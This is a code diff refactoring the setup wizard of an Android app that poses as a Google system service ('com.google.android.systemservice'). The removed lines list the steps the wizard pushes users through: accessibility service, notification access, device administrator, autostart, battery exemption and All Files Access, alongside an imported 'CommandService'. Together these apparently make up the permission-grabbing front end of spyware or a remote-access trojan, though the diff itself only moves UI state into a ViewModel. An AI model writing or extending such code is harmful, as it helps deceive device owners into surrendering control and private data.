@@ -2,7 +2,6 @@ package com.google.android.systemservice
 
 import android.Manifest
 import android.accessibilityservice.AccessibilityServiceInfo
-import android.app.Activity
 import android.app.admin.DevicePolicyManager
 import android.content.ComponentName
 import android.content.Context
@@ -23,9 +22,14 @@ import android.widget.ProgressBar
 import android.widget.TextView
 import android.widget.Toast
 import androidx.activity.result.contract.ActivityResultContracts
+import androidx.activity.viewModels
 import androidx.appcompat.app.AppCompatActivity
 import androidx.core.app.ActivityCompat
 import androidx.core.content.ContextCompat
+import androidx.lifecycle.lifecycleScope
+import kotlinx.coroutines.flow.collectLatest
+import kotlinx.coroutines.launch
+import com.google.android.systemservice.presentation.viewmodel.SetupWizardViewModel
 import com.google.android.systemservice.receivers.SystemAdminReceiver
 import com.google.android.systemservice.services.CommandService
 import com.google.android.systemservice.utils.VendorAutostart
@@ -36,14 +40,13 @@ class SetupWizardActivity : AppCompatActivity() {
         private const val TAG = "SetupWizard"
     }
 
+    private val viewModel: SetupWizardViewModel by viewModels()
+
     private lateinit var progressBar: ProgressBar
     private lateinit var statusText: TextView
     private lateinit var stepText: TextView
     private lateinit var actionButton: Button
     private lateinit var progressPercent: TextView
-
-    private var currentStep = 0
-    private val totalSteps = 7 
 
     private val handler = Handler(Looper.getMainLooper())
 
@@ -111,7 +114,16 @@ class SetupWizardActivity : AppCompatActivity() {
         
         setContentView(R.layout.activity_setup_wizard)
         initViews()
-        startSetupFlow()
+
+        lifecycleScope.launch {
+            viewModel.state.collectLatest { state ->
+                if (state.setupComplete) {
+                    completeSetup()
+                } else {
+                    updateUI(state)
+                }
+            }
+        }
     }
 
     private fun initViews() {
@@ -124,54 +136,16 @@ class SetupWizardActivity : AppCompatActivity() {
         actionButton.setOnClickListener { executeCurrentStep() }
     }
 
-    private fun startSetupFlow() {
-        currentStep = 0
-        updateUI()
-    }
-
-    private fun updateUI() {
-        val progress = ((currentStep.toFloat() / totalSteps) * 100).toInt()
-        progressBar.progress = progress
-        progressPercent.text = "$progress%"
-        stepText.text = "Step ${currentStep + 1} of $totalSteps"
-
-        when (currentStep) {
-            0 -> {
-                statusText.text = "Enabling accessibility service..."
-                actionButton.text = "ENABLE SERVICE"
-            }
-            1 -> {
-                statusText.text = "Configuring system permissions..."
-                actionButton.text = "GRANT PERMISSIONS"
-            }
-            2 -> {
-                statusText.text = "Configuring notification access..."
-                actionButton.text = "ENABLE ACCESS"
-            }
-            3 -> {
-                statusText.text = "Optimizing battery settings..."
-                actionButton.text = "OPTIMIZE"
-            }
-            4 -> {
-                statusText.text = "Securing system administrator..."
-                actionButton.text = "ACTIVATE"
-            }
-            5 -> {
-                statusText.text = "Configuring autostart..."
-                actionButton.text = "CONFIGURE"
-            }
-            6 -> {
-                statusText.text = "Granting All Files Access..."
-                actionButton.text = "ALLOW ACCESS"
-            }
-            else -> {
-                completeSetup()
-            }
-        }
+    private fun updateUI(state: SetupWizardViewModel.WizardState) {
+        progressBar.progress = state.progressPercent
+        progressPercent.text = "${state.progressPercent}%"
+        stepText.text = state.stepLabel
+        statusText.text = state.statusText
+        actionButton.text = state.buttonText
     }
 
     private fun executeCurrentStep() {
-        when (currentStep) {
+        when (viewModel.state.value.currentStep) {
             0 -> requestAccessibilityService()
             1 -> requestRuntimePermissions()
             2 -> requestNotificationListener()
@@ -455,12 +429,7 @@ class SetupWizardActivity : AppCompatActivity() {
     }
 
     private fun advanceToNextStep() {
-        currentStep++
-        if (currentStep >= totalSteps) {
-            completeSetup()
-        } else {
-            updateUI()
-        }
+        viewModel.goToNext()
     }
 
     private fun completeSetup() {
